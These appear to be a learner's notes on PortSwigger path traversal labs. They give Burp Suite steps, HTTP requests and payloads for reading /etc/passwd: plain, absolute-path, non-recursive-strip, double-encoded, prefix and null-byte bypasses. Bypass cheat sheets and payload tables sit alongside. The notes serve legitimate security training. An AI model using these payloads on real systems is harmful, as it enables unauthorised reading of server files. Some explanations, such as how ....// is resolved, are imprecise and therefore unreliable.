# **🛡️ PortSwigger Path traversal (directory  traversal).**

🙏 Welcome to my personal notes on Path Traversal-related challenges and labs on [https://portswigger.net/web-security/all-labs\#path-traversal](https://portswigger.net/web-security/all-labs#path-traversal).These notes are written from scratch based on techniques I practiced.

📛 Lab: File path traversal, simple case

## **🎯 Objective**

This lab contains a path traversal vulnerability in the display of product images.

To solve the lab, retrieve the contents of the /etc/passwd file.         

## **⚙️ Step-by-Step Solution (using Burp Suite)**

### **1\. 🔍 Access the Lab**

* Click "ACCESS THE LAB" on the challenge page to launch the vulnerable site.  
* You’ll be redirected to the storefront.

### **2\. 🕵️‍♂️ Intercept an Image Request**

* In Burp Suite:

  * Enable **Intercept** in the **Proxy** tab.  
  * Click on any product to view details and images and forward it in proxy **or** click on any product then click on intercept, right click to open image in the new tab.

You should see a request like:

GET /image?filename=9.jpg HTTP/2  
Host: [0a46008404e283d4800cead9002e000c.web-security-academy.net](http://0a46008404e283d4800cead9002e000c.web-security-academy.net)

* ### Send it to the **repeater**.

### **3\. 🧨 Modify the Payload**

Change the filename parameter to:  
../../../etc/passwd

Final request:  
GET /image?filename=../../../etc/passwd HTTP/2 

Host: [0a46008404e283d4800cead9002e000c.web-security-academy.net](http://0a46008404e283d4800cead9002e000c.web-security-academy.net)

### **4\. 📥 Forward and Observe**

* Forward the request and check the response in Burp or your browser.

You should see the contents of /etc/passwd, such as:

root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
...  
**💥Boom You solved the lab.**

## **🔐 Common Obstacles to Exploiting Path Traversal**

### Many applications that place user input into file paths implement defenses against path traversal attacks. These can often be bypassed.

### **1\. 🔁 Stripping ../ or Blocking Traversal Patterns**

## **Obstacle:** The app removes ../ from input.

## The application may sanitize input by removing or encoding ../, null bytes (%00), or other traversal patterns.

## **Bypass Techniques:**

* ## **Double encoding:**    %252e%252e%252f → decodes to %2e%2e/ → ../ 

* ## **Obscure encodings:** 

  * ## %c0%ae%c0%ae/ (legacy UTF-8) 

  * ## ..%2f or ..%5c (Windows backslash) 

* ## **Mid-path injection:**    ....// \= still resolves to ../ 

### **2\. 🛣️ Normalization Without Validation**

## **Obstacle:** The app calls normalize() or realpath() but doesn't verify the path is within a safe directory.

## The app blocks or sanitizes ../../../ (traversal), but fails to stop direct input like file=/etc/passwd.

## **Bypass Technique:**

## Direct access using:  filename=/etc/passwd

* ##  This skips traversal entirely and targets absolute paths.

### **3\. 🚫 Input Blacklisting**

## **Obstacle:**

## The application tries to **block malicious** input by **blacklisting** certain strings or patterns, such as:

* ## "../"

* ## "..\\\\"

* ## "etc/passwd"

* ## "%2e%2e%2f" 

## **Bypass Techniques:**

Blacklists are easy to bypass, because attackers can:

* **Encode payloads**  
   e.g. **%2e%2e%2f** (URL-encoded ../)  
   or double-encoding: **%252e%252e%252f**

* **Use alternate traversal formats**  
   e.g. **..\\\\** on Windows, or mixed slashes: **..\\/..\\/**  (..\\/..\\/etc/passwd)

* **Insert noise characters**  
   e.g. **....//, ..%00/, or .. .//** (some filters fail here)

* **Leverage Unicode or UTF-16 tricks**  
   Some filters don’t catch characters like **%c0%ae** (malformed but interpretable as .)

* ## **Obfuscated traversal:**

  * ## **..;.\\/** → sometimes allowed by legacy decoders

  * ## Mixed slashes: **..\\/..\\/etc/passwd** 

* ## **Extension bypass:**

  * ###        **Null Byte Injection**

    ### Payload:     **/etc/passwd%00.png**

    ### **Effect**:

    ### In older PHP (pre-5.3.4) and C-based languages, %00 (null byte) terminates the string, so:

    * ### App thinks: it's a .png

    * ### OS reads: /etc/passwd

  ### 

* ## **passwd::$DATA** on NTFS to evade some filters 

### **4\. 🛡️ Path Resolution Libraries (Sandboxing)**

## **Obstacle:** This refers to using **secure file path resolution libraries or techniques** to **confine file access within a "safe" directory** — essentially implementing a virtual sandbox.

## 

## **🎯 Bypass Possibilities (if sandboxing is weak or misused)**

### **🔓 1\. Developer forgets to validate**

## They use realpath() or normalize() but don't check if the result is inside the base dir.  ➡️ You can send /etc/passwd directly.

### **🔓 2\. Symbolic link abuse**

## If attacker can upload a symlink:

* ## Upload: symlink → /etc 

* ## Then request: symlink/passwd    ➡️ May bypass the path check depending on resolution order.

### **🔓 3\. Double-normalization confusion**

## Some buggy apps normalize the input *before* joining with base path:

## 

## // Vulnerable

## let path \= normalize(user\_input);

## let fullPath \= BASE\_PATH \+ '/' \+ path;

## 

## ➡️ You can send something like:

## ../../etc/passwd

## and sneak out of the base path.

### **5\. 🧱 WAF or Web Server Filtering**

## **Obstacle:** WAF detects common patterns like ../etc/passwd.

## **Bypass Techniques:**

* ## **Chunked traversal:** ..%2f..%2f..%2fetc%2fpasswd 

* ## **Case-insensitive decoders:** ..%2F..%2Fetc%2FPASSWD 

* ## **Recursive decoders:** ....// or %2e%2e%2f 

### **🧪 Field Tactics**

| Payload Type | Example | Use Case |
| ----- | ----- | ----- |
| Simple traversal | ../../../etc/passwd | Basic test |
| Encoded | %2e%2e%2f%2e%2e%2fetc%2fpasswd | Encoding bypass |
| Double encoded | %252e%252e%252fetc%252fpasswd | Double-decoding WAF evasion |
| Absolute path | /etc/passwd | Skip traversal sanitization |
| Windows | ..\\..\\..\\windows\\win.ini | NT/Windows target |

## 

## 

# **Lab: File path traversal, traversal sequences blocked with absolute path bypass**

## **🎯 Objective**

# This lab contains a path traversal vulnerability in the display of product images.

The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

To solve the lab, retrieve the contents of the /etc/passwd file.         

## 

## **⚙️ Step-by-Step Walkthrough**

### **1\. 🧭 Launch the Lab**

* Click **"ACCESS THE LAB"** on the challenge page.  
* The storefront will open in a browser tab.

### **2\. 🧑‍💻 Open Burp Suite**

* Ensure **Intercept** is enabled in **Proxy**.  
* Set your browser to use Burp’s proxy.

### **3\. 🖼️ Trigger an Image Request**

* On the lab site, click any product to view it and forward it in proxy.

You’ll see an image being loaded, e.g.:  
GET /image?filename=37.jpg HTTP/2  
Host: \<your-lab\>.web-security-academy.net

### **4\. 📤 Send to Repeater**

* Right-click the request in **Proxy** → **Send to Repeater**.  
* Go to the **Repeater** tab.

### **5\. 🧨 Modify the Payload**

Replace the filename value with an **absolute path**:

/etc/passwd

Final request:  
GET /image?filename=/etc/passwd HTTP/2  
Host: \<your-lab\>.web-security-academy.net

### **6\. 📥 Send & Observe**

* Click **Send**.

In the response tab, you should see content like:

 ruby  
CopyEdit  
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
...

* Show response in browser.

**💥Boom you solved the lab.**

**Flaw:**  
The app **blocks ../**  
But **fails to restrict absolute paths** :

/etc/passwd

# **Lab: File path traversal, traversal sequences stripped non-recursively**

## **⚙️ Step-by-Step Guide (Burp Suite)**

### **1\. 🧭 Launch the Lab**

Click “ACCESS THE LAB” to open the target application in your browser.

### **2\. 🧑‍💻 Set Up Burp and Trigger an Image Request**

* Start **Burp Suite**.  
* Enable **Intercept** in the **Proxy** tab.  
* Click on any product to view details and images and forward it in proxy **or** click on any product then click on intercept, right click to open image in the new tab.

Capture the request that loads an image, for example:

GET /image?filename=8.jpg HTTP/2

### **3\. 📤 Send the Request to Repeater**

* Right-click → **Send to Repeater**  
* Go to the **Repeater** tab.

### **4\. 🧨 Modify the Payload**

Change the filename parameter to:  
....//....//....//etc/passwd

*  This bypasses naive single-pass ../ filtering because:  
  * The app strips one instance of ../, but doesn't normalize again.  
  * So ....// resolves to ../ when used in actual file path resolution.

### **6\. 🚀 Send the Request**

* Click **Send**.

You should now see the contents of /etc/passwd in the response:

root:x:0:0:root:/root:/bin/bash  
...

**💥Boom You solved the lab** 

## **🧠 Why This Worked**

* The app only strips ../ **once**, not recursively.

Your payload:  
....//....//....//etc/passwd

*  slips through filtering because:

  * ....// ≠ ../ (so it survives)  
  * But the file system **interprets** it as ../ anyway.  
* End result: You trick the app into resolving to /etc/passwd.

## 

## **🧬 Traversal Sequence Obfuscation Techniques**

When the **web server (e.g., NGINX, Apache, IIS)** strips or normalizes ../, it may miss **obfuscated variants**. You can trick the server by encoding traversal in various ways before it even reaches the app layer.

### **🧠 Bypass Methods**

| Technique | Payload Variant | Explanation |
| ----- | ----- | ----- |
| 🔹 URL Encoding | %2e%2e%2f | Encoded ../ |
| 🔸 Double URL Encode | %252e%252e%252f | Decodes twice → becomes ../ |
| 🌀 Unicode Obfuscate | ..%c0%af or ..%e0%80%af | Legacy UTF-8 for / |
| ⛓️ Slash Variants | ..%2f, ..%5c, ..%ef%bc%8f | Alternative representations of / |
| 🧨 Dot Confusion | ....//, ..../ | Confuses naive filters |

# **Lab: File path traversal, traversal sequences stripped with superfluous URL-decode**

## **🎯 Objective:**

This lab contains a path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the /etc/passwd file.         

## **⚙️ Step-by-Step Guide (Burp Suite)**

### **1\. 🧭 Launch the Lab**

Click “ACCESS THE LAB” to open the target application in your browser.

### **2\. 🧑‍💻 Set Up Burp and Trigger an Image Request**

* Start **Burp Suite**.  
* Enable **Intercept** in the **Proxy** tab.  
* Click on any product to view details and images and forward it in proxy **or** click on any product then click on intercept, right click to open image in the new tab.

Capture the request that loads an image, for example:

GET /image?filename=8.jpg HTTP/2

### **3\. 📤 Send the Request to Repeater**

* Right-click → **Send to Repeater**  
* Go to the **Repeater** tab.

### **4\. 🧨 Modify the Payload**

Replace the filename value with this **double-encoded traversal sequence**:

..%252f..%252f..%252fetc/passwd

Final request example:  
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/2

Host: \<your-lab-id\>.web-security-academy.net

**🚀Send the Request**

You should see contents like:

root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

...

**💥Boom you solve the lab**

## **🧠 Why This Worked: Superfluous URL-Decoding**

### **🧱 Application Behavior:**

* **Blocks ../ or %2e%2e%2f**  
* Then **URL-decodes** input **after** filtering

## **🛠️ Real-Life Analogy**

🔒 A guard checks your bag for **guns**. You hide it inside a box labeled **"gift"**.

* Guard checks the bag — sees "gift" → allows it ✅  
* Later, you open the gift → it’s a gun 😈

That’s what **filtering before decoding** does — the danger is still hidden inside.

### **🧨 Your Payload:**

..%252f..%252f..%252fetc/passwd

* %252f \= double-encoded /

* Decodes once to %2f, then again to /

* Resulting in effective ../../../etc/passwd

#  **Base path prefix bypass:**

## **🛣️ Base Path Prefix Bypass (Traversal Inside a Trusted Prefix)**

### **🔐 What the App Tries to Do:**

A developer might try to "secure" path access like this:

user\_input \= request.args\['filename'\]  
if not user\_input.startswith('/var/www/images'):  
    return "Access Denied"

\# Then proceeds to open the file  
open(user\_input).read()

They’re checking if the **user-supplied input** *starts with* /var/www/images. But...

### **🔓 Bypass Example:**

You supply:

filename=/var/www/images/../../../etc/passwd

* ✅ It *does* start with /var/www/images  
* ❌ But resolves to /etc/passwd

If the app does not normalize or resolve the path before using it, this works.

# **Lab: File path traversal, validation of start of path**

## **🎯 Goal:**

 This lab contains a path traversal vulnerability in the display of product images.         

Bypass validation that checks if a path starts with /var/www/images/ and retrieve /etc/passwd.

## **⚙️ Step-by-Step Guide (Burp Suite)**

### **1\. 🧭 Launch the Lab**

Click “ACCESS THE LAB” to open the target application in your browser.

### **2\. 🧑‍💻 Set Up Burp and Trigger an Image Request**

* Start **Burp Suite**.  
* Enable **Intercept** in the **Proxy** tab.  
* Click on any product to view details and images and forward it in proxy **or** click on any product then click on intercept, right click to open image in the new tab.

Capture the request that loads an image, for example:  
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2  
Host:

Host: \<your-lab-id\>.web-security-academy.net

### **3\. 📤 Send the Request to Repeater**

* Right-click → **Send to Repeater**  
* Go to the **Repeater** tab.

### **4\. 🧨 Modify the filename Parameter**

Replace the filename value with:

**/var/www/images/../../../etc/passwd**

Full modified request:

GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2

Host: \<your-lab-id\>.web-security-academy.net

### **5\. 🚀 Send and Check the Response**

* Click **Send**.

If successful, you'll see :  
root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

...

**💥Boom, you solved the lab\!**

### **🧠 Why This Works**

* The app **only checks that the filename starts with** /var/www/images/.  
* It **doesn’t validate the final resolved path**.  
* So /var/www/images/../../../etc/passwd:  
  * **Passes the check** (starts with /var/www/images/)  
  * But **resolves to** /etc/passwd when the server accesses it with /var/www/images/../../../etc/passwd

## **🧨 Base Path *Suffix* Bypass**

This happens when the application **checks if the user-supplied path ends with a trusted subpath** (like /images, /safe, or .png) — but fails to properly validate the **full resolved path**.

filename=/etc/passwd/images

* The app sees it ends with /images ✅  
* But resolves it to a **non-image directory or file**

#### **Bypass** 

filename=/var/www/files/../../../etc/passwd.png

## **🔓 Path Traversal \+ Extension Validation \+ Null Byte Bypass**

### **🧠 The Problem**

Many applications try to prevent malicious file access by:

* Checking that the **filename ends with a “safe” extension** (like .jpg, .png, .txt).  
* But they **do not properly handle null bytes (%00)** in the input.

In C/C++ and some early versions of PHP, a %00 is interpreted as a **string terminator** — even if more characters follow it.

#### **✅ Intended code logic:**

php

if (endsWith($\_GET\['file'\], '.png')) {

    // allow file to be read

}

# **Lab: File path traversal, validation of file extension with null byte bypass**

## **🎯 Objective:**

Bypass the app’s .png extension check using a **null byte injection**, and read:

/etc/passwd

## **⚙️ Step-by-Step Guide (Burp Suite)**

### **1\. 🧭 Launch the Lab**

Click “ACCESS THE LAB” to open the target application in your browser.

### **2\. 🧑‍💻 Set Up Burp and Trigger an Image Request**

* Start **Burp Suite**.  
* Enable **Intercept** in the **Proxy** tab.  
* Click on any product to view details and images and forward it in proxy **or** click on any product then click on intercept, right click to open image in the new tab.

Capture the request that loads an image, for example:  
GET /image?filename=21.jpg HTTP/2  
Host:

Host: \<your-lab-id\>.web-security-academy.net

### **3\. 📤 Send the Request to Repeater**

* Right-click → **Send to Repeater**  
* Go to the **Repeater** tab.

### **4\. 🧨 Modify the Payload**

Change the filename to:

http

CopyEdit

../../../etc/passwd%00.png

This tricks the application:

* It **sees** .png (due to %00)  
* But when reading the file, it **stops at the null byte**:

   bash  
  CopyEdit  
  ../../../etc/passwd

### **5\. 🚀 Send the Request**

Click **Send** in Repeater.

### **6\. 🔍 Check the Response**

You should see:

root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

...

**💥Boom,you solved the lab.**

### **🧠 Why This Works**

* ## The app checks if the string ends with .png (e.g., using .endsWith())

* ## But it doesn't validate the **real file being opened**

* ## %00 \= Null byte \= end-of-string in low-level file APIs (e.g., C, PHP pre-5.3.4)

## 

## **🚫 Modern Languages Block It**

* Most modern runtimes **reject null bytes** in file paths:  
  * PHP ≥ 5.3.4

  * Python ≥ 3.2

  * Java ≥ 7

  * Node.js

## **🧬 What Is a Null Byte?**

A **null byte** is a special character in computing, represented as:

* ASCII: 0x00  
* URL-encoded: %00

It means **“end of string”** in many programming languages, especially in low-level languages like **C** and in older versions of **PHP**.

### **🧠 How It Works in File Access**

Many web apps check the **string** of the filename to make sure it ends in .png or another allowed extension:

if (endsWith($filename, ".png")) {

    readFile($filename);

}

But in some languages or libraries (e.g., older PHP/C backends), the file system call only reads up to the **first null byte**.

### **🧨 Example Attack**

Request:

GET /image?filename=../../../etc/passwd%00.png

### **What the App Sees:**

* **String validation:** ✅ Passes (it ends in .png)  
* **Real file being read:**  
  * Stops at %00  
  * So it opens: ../../../etc/passwd

